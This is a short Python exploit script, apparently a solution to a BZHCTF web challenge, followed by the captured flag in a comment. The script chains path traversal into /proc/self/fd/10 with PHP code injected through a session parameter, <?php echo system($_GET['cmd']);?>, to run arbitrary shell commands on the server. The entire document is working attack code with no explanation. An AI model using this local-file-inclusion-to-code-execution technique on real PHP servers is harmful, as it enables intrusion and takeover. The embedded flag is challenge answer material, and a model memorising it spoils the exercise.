import requests
import sys

cookies = {"PHPSESSID":"3d1b9fd55c75973b2bbe8260584eef8f"}

r = requests.get(f"https://les-cremes-de-madame-loic.ctf.bzh:21000/mamiesecret?page=../../../../../../../../../../../../proc/self/fd/10&_SESSION[name]=<?php echo system($_GET[\"cmd\"]);?>&cmd={sys.argv[1]}", cookies=cookies, verify=False)
print(r.text[:r.text.index("<!DOCTYPE")])

# BZHCTF{m4m13_4ur41t_du_3ng4g3r_un3_p3rs0nn3_plus_comp3t3nt3s!!}
